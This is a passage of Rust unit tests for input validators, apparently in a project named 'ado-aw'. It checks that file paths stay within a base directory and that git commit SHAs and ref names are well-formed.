    fn test_ensure_path_within_base() {
        let dir = std::env::temp_dir().join(format!("ado-aw-validate-{}", std::process::id()));
        let inner = dir.join("inner");
        std::fs::create_dir_all(&inner).unwrap();
        let file = inner.join("f.txt");
        std::fs::write(&file, b"x").unwrap();

        assert!(ensure_path_within_base(&file, &dir, "f").is_ok());
        // A real escape: base exists but the candidate resolves outside it.
        let sibling = dir.join("sibling");
        std::fs::create_dir_all(&sibling).unwrap();
        let sibling_file = sibling.join("g.txt");
        std::fs::write(&sibling_file, b"y").unwrap();
        assert!(ensure_path_within_base(&sibling_file, &inner, "f").is_err());
        // A nonexistent base cannot be canonicalized, which is also an error.
        let outside = std::env::temp_dir();
        assert!(ensure_path_within_base(&file, &outside.join("nonexistent-base-xyz"), "f").is_err());
        // Missing candidate canonicalization fails.
        assert!(ensure_path_within_base(&dir.join("missing"), &dir, "f").is_err());

        let _ = std::fs::remove_dir_all(&dir);
    }

    // ── Git ref / commit validators ────────────────────────────────────

    #[test]
    fn test_is_valid_commit_sha() {
        assert!(is_valid_commit_sha("0123456789abcdef0123456789abcdef01234567"));
        assert!(is_valid_commit_sha("0123456789ABCDEF0123456789abcdef01234567"));
        assert!(!is_valid_commit_sha("0123")); // too short
        assert!(!is_valid_commit_sha("z123456789abcdef0123456789abcdef01234567")); // non-hex
    }

    #[test]
    fn test_validate_commit_sha() {
        assert!(validate_commit_sha("0123456789abcdef0123456789abcdef01234567", "c").is_ok());
        assert!(validate_commit_sha("short", "c").is_err());
        assert!(validate_commit_sha("zzz3456789abcdef0123456789abcdef01234567", "c").is_err());
    }

    #[test]
    fn test_validate_git_ref_name() {
        assert!(validate_git_ref_name("feature/my-analysis", "b").is_ok());
        assert!(validate_git_ref_name("release-1.0", "b").is_ok());
        assert!(validate_git_ref_name("", "b").is_err());
        assert!(validate_git_ref_name("foo..bar", "b").is_err());
        assert!(validate_git_ref_name("foo@{bar", "b").is_err());
        assert!(validate_git_ref_name("foo.lock", "b").is_err());
        assert!(validate_git_ref_name("foo//bar", "b").is_err());
        assert!(validate_git_ref_name("foo:bar", "b").is_err());
        assert!(validate_git_ref_name("foo/.hidden", "b").is_err());
    }
}
